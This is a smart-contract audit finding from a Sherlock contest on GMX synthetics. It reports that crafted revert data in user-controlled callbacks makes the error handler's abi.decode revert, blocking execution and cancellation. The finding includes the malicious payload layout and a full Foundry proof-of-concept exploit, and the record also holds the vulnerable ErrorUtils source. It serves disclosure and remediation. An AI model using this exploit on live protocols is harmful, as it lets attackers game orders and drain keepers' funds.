{
  "Title": "H-16: Incomplete error handling causes execution and freezing/cancelling of Deposits/Withdrawals/Orders to fail.",
  "Content": "# Issue H-16: Incomplete error handling causes execution and freezing/cancelling of Deposits/Withdrawals/Orders to fail. \n\nSource: https://github.com/sherlock-audit/2023-02-gmx-judging/issues/119 \n\n## Found by \n0xdeadbeef, KingNFT, hack3r-0m\n\n## Summary\n\nUsers can define callbacks for Deposits/Withdrawals/Orders execution and cancellations.\nGMX protocol attempts to manage errors during the execution of the callbacks \n\nA user controlled callback can return a specially crafted revert reason that will make the error handling revert.\n\nBy making the execution and cancelation revert, a malicious actor can game orders and waste keeper gas.\n\n## Vulnerability Detail\n\nThe bug resides in `ErrorUtils`s `getRevertMessage`  that is called on every callback attempt. Example of deposit callback:\n```solidity\ntry IDepositCallbackReceiver(deposit.callbackContract()).afterDepositExecution{ gas: deposit.callbackGasLimit() }(key, deposit) {\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n            emit AfterDepositExecutionError(key, deposit, reason, reasonBytes);\n        }\n```\n`ErrorUtils`s `getRevertMessage`:\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/utils/ErrorUtils.sol#L7\n```solidity\nfunction getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {\n        // If the result length is less than 68, then the transaction either panicked or failed silently\n        if (result.length < 68) {\n            return (\"\", false);\n        }\n\n        bytes4 errorSelector = getErrorSelectorFromData(result);\n\n        // 0x08c379a0 is the selector for Error(string)\n        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/\n        if (errorSelector == bytes4(0x08c379a0)) {\n            assembly {\n                result := add(result, 0x04)\n            }\n\n            return (abi.decode(result, (string)), true);\n        }\n\n        // error may be a custom error, return an empty string for this case\n        return (\"\", false);\n    }\n```\n\nAs can be seen in the above above snippets, the `reasonBytes` from the catch statement is passed to `getRevertMessage` which tries to extract the `Error(string)` message from the revert.\nThe issue is that the data extracted from the revert can be crafted to revert on `abi.decode`. \n\nI will elaborate:\nCorrect (expected) revert data looks as follows:\n1st 32 bytes: 0x000..64 (bytes memory size)\n2nd 32 bytes: 0x08c379a0 (Error(string) selector)\n3rd 32 bytes: offset to data\n4th 32 bytes: length of data\n5th 32 bytes: data \n\n`abi.decode` reverts if the data is not structure correctly.\nThere can be two reasons for revert:\n1. if the 3rd 32 bytes (offset to data) is larger then the uint64 (0xffffffffffffffff)\n\t1. Simplified yul: `if gt(offset, 0xffffffffffffffff) { revert }`\n2. if the 3rd 32 bytes (offset to data) is larger then the uint64 of the encoded data, the call will revert\n\t1. Simplieifed yul: `if iszero(slt(add(offset, 0x1f), size) { revert }`\n\nBy reverting with the following data in the callback, the `getRevertMessage` will revert:\n0x000....64\n0x0x08c379a0...000\n0xffffffffffffffff....000\n0x000...2\n0x4141\n\n## Impact\n\nThere are two impacts will occur when the error handling reverts:\n\n### (1) Orders can be gamed\nSince the following callbacks are controlled by the user,:\n- `afterOrderExecution`\n- `afterOrderCancellation`\n- `afterOrderFrozen`\n\nThe user can decide when to send the malformed revert data and when not.\nEssentially preventing keepers from freezing orders and from executing orders until it fits the attacker.\n\nThere are two ways to game the orders:\n1. An attacker can create a risk free order, by setting a long increase order. If the market increases in his favor, he can decide to \"unblock\" the execution and receive profit. If the market decreases, he can cancel the order or wait for the right timing.\n2. An attacker can create a limit order with a size larger then what is available in the pool. The attacker waits for the price to hit and then deposit into the pool to make the transaction work. This method is supposed to be prevented by freezing orders, but since the attacker can make the `freezeOrder` revert, the scenario becomes vulnerable again. \n\n### (2) drain keepers funds\nSince exploiting the bug for both execution and cancellation, keepers will ALWAYS revert when trying to execute Deposits/Withdrawals/Orders.\nThe protocol promises to always pay keepers at-least the execution cost. By making the execution and cancellations revert the Deposits/Withdrawals/Orders will never be removed from the store and keepers transactions will keep reverting until potentially all their funds are wasted.\n\n## Code Snippet\n\nI have constructed an end-to-end POC in foundry. \n\nTo get it running, first install foundry using the following command:\n1. `curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)\n4. If local node is not already running and contracts are not deployed, configured and funded - execute the following:\n```bash\nnpx hardhat node\n```\n3 Perform the following set of commands from the repository root.\n```bash\nrm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit\n```\n5. Add the following to `foundry/test/NoneExecutableDeposits.t.sol\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\ninterface IExchangeRouter {\n    function createDeposit(DrainWithdrawal.CreateDepositParams calldata params) external returns (bytes32);\n}\n\ninterface IDepositHandler {\n    function executeDeposit( bytes32 key, SetPricesParams calldata oracleParams) external;\n}\ninterface IReader {\n    function getMarket(address dataStore, address key) external view returns (Market.Props memory); \n}\n\ninterface IDataStore {\n    function getBytes32(bytes32 key) external view returns (bytes32);\n    function setUint(bytes32 key, uint256 value) external;\n}\nlibrary Market {\n    struct Props {\n        address marketToken;\n        address indexToken;\n        address longToken;\n        address shortToken;\n    }\n}\nlibrary Deposit {\n    struct Props {\n        Addresses addresses;\n        Numbers numbers;\n        Flags flags;\n    }\n    struct Addresses {\n        address account;\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialLongToken;\n        address initialShortToken;\n        address[] longTokenSwapPath;\n        address[] shortTokenSwapPath;\n    }\n    struct Numbers {\n        uint256 initialLongTokenAmount;\n        uint256 initialShortTokenAmount;\n        uint256 minMarketTokens;\n        uint256 updatedAtBlock;\n        uint256 executionFee;\n        uint256 callbackGasLimit;\n    }\n    struct Flags {\n        bool shouldUnwrapNativeToken;\n    }\n}\nstruct SetPricesParams {\n    uint256 signerInfo;\n    address[] tokens;\n    uint256[] compactedMinOracleBlockNumbers;\n    uint256[] compactedMaxOracleBlockNumbers;\n    uint256[] compactedOracleTimestamps;\n    uint256[] compactedDecimals;\n    uint256[] compactedMinPrices;\n    uint256[] compactedMinPricesIndexes;\n    uint256[] compactedMaxPrices;\n    uint256[] compactedMaxPricesIndexes;\n    bytes[] signatures;\n    address[] priceFeedTokens;\n}\n\ncontract Keeper is Test {\n    fallback() external payable {\n    }\n}\n\ncontract Callback is Test {\n    function afterDepositExecution(bytes32 key, Deposit.Props memory deposit) external {\n        assembly{\n            let free_mem_ptr := mload(64)\n            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)\n            mstore(add(free_mem_ptr, 4), 0xffffffffffffff ) // This will cause a revert \n            mstore(add(free_mem_ptr, 36), 8)\n            mstore(add(free_mem_ptr, 68), \"deadbeef\")\n            revert(free_mem_ptr, 100)\n        }\n    }\n    function afterDepositCancellation(bytes32 key, Deposit.Props memory deposit) external {\n        assembly{\n            let free_mem_ptr := mload(64)\n            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)\n            mstore(add(free_mem_ptr, 4), 0xffffffffffffff ) // This will cause a revert \n            mstore(add(free_mem_ptr, 36), 8)\n            mstore(add(free_mem_ptr, 68), \"deadbeef\")\n            revert(free_mem_ptr, 100)\n        }\n    }\n}\n\ninterface IRoleStore{\n    function grantRole(address account, bytes32 roleKey) external;\n}\n\ncontract DrainWithdrawal is Test {\n    struct CreateDepositParams {\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialLongToken;\n        address initialShortToken;\n        address[] longTokenSwapPath;\n        address[] shortTokenSwapPath;\n        uint256 minMarketTokens;\n        bool shouldUnwrapNativeToken;\n        uint256 executionFee;\n        uint256 callbackGasLimit;\n    }\n\n    uint256 public constant COMPACTED_64_BIT_LENGTH = 64;\n    uint256 public constant COMPACTED_64_BITMASK = ~uint256(0) >> (256 - COMPACTED_64_BIT_LENGTH);\n    \n    uint256 public constant COMPACTED_32_BIT_LENGTH = 32;\n    uint256 public constant COMPACTED_32_BITMASK = ~uint256(0) >> (256 - COMPACTED_32_BIT_LENGTH);\n\n    uint256 public constant COMPACTED_8_BIT_LENGTH = 8;\n    uint256 public constant COMPACTED_8_BITMASK = ~uint256(0) >> (256 - COMPACTED_8_BIT_LENGTH);\n\n    IExchangeRouter EXCHANGE_ROUTER = IExchangeRouter(0x4bf010f1b9beDA5450a8dD702ED602A104ff65EE);\n    address dataStore = 0x09635F643e140090A9A8Dcd712eD6285858ceBef;\n    IReader reader = IReader(0xD49a0e9A4CD5979aE36840f542D2d7f02C4817Be);\n    address WETH = 0x99bbA657f2BbC93c02D617f8bA121cB8Fc104Acf;\n    address USDC = 0x9d4454B023096f34B160D6B654540c56A1F81688;\n    address depositVault = 0xB0f05d25e41FbC2b52013099ED9616f1206Ae21B;\n    address controller = 0x1429859428C0aBc9C2C47C8Ee9FBaf82cFA0F20f;\n    address roleStore = 0x5FbDB2315678afecb367f032d93F642f64180aa3;\n    address ROLE_ADMIN = 0xe1Fd27F4390DcBE165f4D60DBF821e4B9Bb02dEd;\n    IDepositHandler depositHandler = IDepositHandler(0xD42912755319665397FF090fBB63B1a31aE87Cee);\n\n    address signer = 0xBcd4042DE499D14e55001CcbB24a551F3b954096;\n    uint256 pk = 0xf214f2b2cd398c806f84e317254e0f0b801d0643303237d97a22a48e01628897;\n\n    Callback callback = new Callback();\n    Keeper ORDER_KEEPER = new Keeper();\n\n    using Market for Market.Props;\n\n\n    function setUp() public {\n    }\n    function testNoneExecutableDeposits() external {\n        // Setup market\n        Market.Props memory market = reader.getMarket(dataStore, address(0xc50051e38C72DC671C6Ae48f1e278C1919343529));\n        address marketWethUsdc = market.marketToken;\n        address wethIndex = market.indexToken;\n        address wethLong = market.longToken;\n        address usdcShort = market.shortToken;\n        vm.startPrank(controller);\n        IDataStore(dataStore).setUint(keccak256(abi.encode(\"EXECUTION_GAS_FEE_MULTIPLIER_FACTOR\")), 10**30); // defualt\n        IDataStore(dataStore).setUint(keccak256(abi.encode(\"NATIVE_TOKEN_TRANSFER_GAS_LIMIT\")),10000); // default\n        vm.stopPrank();\n\n        vm.prank(ROLE_ADMIN);\n        IRoleStore(roleStore).grantRole(address(ORDER_KEEPER), keccak256(abi.encode(\"ORDER_KEEPER\")));\n\n        // validate weth long usdc short index weth\n        assertEq(WETH, wethLong);\n        assertEq(WETH, wethIndex);\n        assertEq(USDC, usdcShort);\n\n        // initial fund deposit vault and weth \n        address[] memory addrArray; \n        deal(USDC, depositVault, 1000 ether);\n        vm.deal(depositVault, 1000 ether);\n        vm.prank(depositVault);\n        WETH.call{value: 1000 ether}(abi.encodeWithSelector(bytes4(keccak256(\"deposit()\"))));\n        vm.deal(WETH, 1000 ether);\n\n        // Create deposit params\n        CreateDepositParams memory deposit = CreateDepositParams(\n            address(this), // receiver\n            address(callback), // callback \n            marketWethUsdc, // market\n            wethLong, // inital longtoken\n            usdcShort, // inital short token\n            addrArray, // longtokenswappath\n            addrArray, // shortokenswappath\n            0, // minmarkettokens\n            true,// shouldunwrapnativetoken\n            1000, // executionfee\n            2000000 // callbackGasLimit\n        );\n\n        // Create deposit!\n        bytes32 depositKey = EXCHANGE_ROUTER.createDeposit(deposit);\n\n        // Attempt to execute deposit\n        vm.startPrank(address(ORDER_KEEPER));\n        SetPricesParams memory params = getPriceParams();\n        vm.expectRevert(); // validate that the below function will revert\n        depositHandler.executeDeposit(depositKey, params);\n        vm.stopPrank();\n\n    }\n\n    function getPriceParams() internal returns (SetPricesParams memory) {\n        address[] memory tokens = new address[](2);\n        tokens[0] = WETH;\n        tokens[1] = USDC;\n        \n        // min oracle block numbers\n        uint256[] memory uncompactedMinOracleBlockNumbers = new uint256[](2);\n        uncompactedMinOracleBlockNumbers[0] = block.number;\n        uncompactedMinOracleBlockNumbers[1] = block.number;\n\n        // decimals 18\n        uint256[] memory uncompactedDecimals = new uint256[](2);\n        uncompactedDecimals[0] = 18;\n        uncompactedDecimals[1] = 18;\n\n        // max price AGE\n        uint256[] memory uncompactedMaxPriceAge = new uint256[](2);\n        uncompactedMaxPriceAge[0] = block.timestamp;\n        uncompactedMaxPriceAge[1] = block.timestamp;\n        \n        uint256[] memory uncompactedMaxPricesIndexes = new uint256[](2);\n        uncompactedMaxPricesIndexes[0] = 0;\n        uncompactedMaxPricesIndexes[1] = 0;\n\n        uint256[] memory uncompactedMaxPrices = new uint256[](2);\n        uncompactedMaxPrices[0] = 1000;\n        uncompactedMaxPrices[1] = 1000;\n\n        // signerInfo\n        uint256 signerInfo = 1;\n        uint256[] memory compactedMinOracleBlockNumbers = getCompactedValues(uncompactedMinOracleBlockNumbers, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);\n        uint256[] memory compactedDecimals = getCompactedValues(uncompactedDecimals, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);\n        uint256[] memory compactedMaxPriceAge = getCompactedValues(uncompactedMaxPriceAge, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);\n        uint256[] memory compactedMaxPricesIndexes = getCompactedValues(uncompactedMaxPricesIndexes, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);\n        uint256[] memory compactedMaxPrices = getCompactedValues(uncompactedMaxPrices, COMPACTED_32_BIT_LENGTH, COMPACTED_32_BITMASK);\n\n        bytes[] memory sig = getSig(tokens, uncompactedDecimals, uncompactedMaxPrices);\n\n        SetPricesParams memory oracleParams = SetPricesParams(\n            signerInfo, // signerInfo\n            tokens, //tokens\n            compactedMinOracleBlockNumbers, // compactedMinOracleBlockNumbers\n            compactedMinOracleBlockNumbers, //compactedMaxOracleBlockNumbers\n            compactedMaxPriceAge, //  compactedOracleTimestamps\n            compactedDecimals, // compactedDecimals\n            compactedMaxPrices, // compactedMinPrices\n            compactedMaxPricesIndexes, // compactedMinPricesIndexes\n            compactedMaxPrices, // compactedMaxPrices\n            compactedMaxPricesIndexes, // compactedMaxPricesIndexes\n            sig, // signatures\n            new address[](0) // priceFeedTokens\n        );\n        return oracleParams;\n    }\n\n    function getSig(address[] memory tokens, uint256[] memory decimals, uint256[] memory prices) internal returns (bytes[] memory){\n        signer = vm.addr(pk);\n        bytes[] memory ret = new bytes[](tokens.length);\n        for(uint256 i=0; i<tokens.length; i++){\n            bytes32 digest = toEthSignedMessageHash(\n                keccak256(abi.encode(\n                    keccak256(abi.encode(block.chainid, \"xget-oracle-v1\")),\n                    block.number,\n                    block.number,\n                    block.timestamp,\n                    bytes32(0),\n                    tokens[i],\n                    getDataStoreValueForToken(tokens[i]),\n                    10 ** decimals[i],\n                    prices[i],\n                    prices[i]\n                ))\n            );\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);\n            ret[i] = abi.encodePacked(r,s,v);\n        }\n        return ret;\n    }\n\n    function getDataStoreValueForToken(address token) internal returns (bytes32) {\n        return IDataStore(dataStore).getBytes32(keccak256(abi.encode(keccak256(abi.encode(\"ORACLE_TYPE\")), token)));\n    }\n\n    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32 message) {\n        assembly {\n            mstore(0x00, \"\\x19Ethereum Signed Message:\\n32\")\n            mstore(0x1c, hash)\n            message := keccak256(0x00, 0x3c)\n        }\n    }\n    function getCompactedValues(\n        uint256[] memory uncompactedValues,\n        uint256 compactedValueBitLength,\n        uint256 bitmask\n    ) internal returns (uint256[] memory) {\n        uint256 compactedValuesPerSlot = 256 / compactedValueBitLength;\n        bool stopLoop = false;\n        uint256[] memory compactedValues = new uint256[](uncompactedValues.length / compactedValuesPerSlot + 1);\n        for(uint256 i=0; i < (uncompactedValues.length - 1) / compactedValuesPerSlot + 1; i++){\n            uint256 valuePerSlot;\n            for(uint256 j=0; j< compactedValuesPerSlot; j++){\n                uint256 index = i * compactedValuesPerSlot + j;\n                if(index >= uncompactedValues.length) {\n                    stopLoop = true;\n                    break;\n                }\n                uint256 value = uncompactedValues[index];\n                uint256 bitValue = value << (j * compactedValueBitLength);\n                valuePerSlot = valuePerSlot | bitValue;\n            }\n            compactedValues[i] = valuePerSlot;\n            if(stopLoop){\n                break;\n            }\n        }\n        return compactedValues;\n    }\n}\n\n```\n6. execute `forge test --fork-url=\"http://127.0.0.1:8545\"  -v -m testNoneExecutableDeposits`\n\n## Tool used\n\nVS Code, Foundry\n\n## Recommendation\n\nWhen parsing the revert reason, validate the offsets are smaller then the length of the encoding.\n\n\n\n## Discussion\n\n**xvi10**\n\nFix in https://github.com/gmx-io/gmx-synthetics/commit/b0bac262191f4f96edc9606192d2e4abfa043dc3\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/6",
  "Code": [
    {
      "filename": "gmx-synthetics/contracts/utils/ErrorUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nlibrary ErrorUtils {\n    // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577\n    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {\n        // If the result length is less than 68, then the transaction either panicked or failed silently\n        if (result.length < 68) {\n            return (\"\", false);\n        }\n\n        bytes4 errorSelector = getErrorSelectorFromData(result);\n\n        // 0x08c379a0 is the selector for Error(string)\n        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/\n        if (errorSelector == bytes4(0x08c379a0)) {\n            assembly {\n                result := add(result, 0x04)\n            }\n\n            return (abi.decode(result, (string)), true);\n        }\n\n        // error may be a custom error, return an empty string for this case\n        return (\"\", false);\n    }\n\n    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {\n        bytes4 errorSelector;\n\n        assembly {\n            errorSelector := mload(add(data, 0x20))\n        }\n\n        return errorSelector;\n    }\n\n    function revertWithParsedMessage(bytes memory result) internal pure {\n        (string memory revertMessage, bool hasRevertMessage) = getRevertMessage(result);\n\n        if (hasRevertMessage) {\n            revert(revertMessage);\n        } else {\n            revertWithCustomError(result);\n        }\n    }\n\n    function revertWithCustomError(bytes memory result) internal pure {\n        // referenced from https://ethereum.stackexchange.com/a/123588\n        uint256 length = result.length;\n        assembly {\n            revert(add(result, 0x20), length)\n        }\n    }\n}"
    }
  ]
}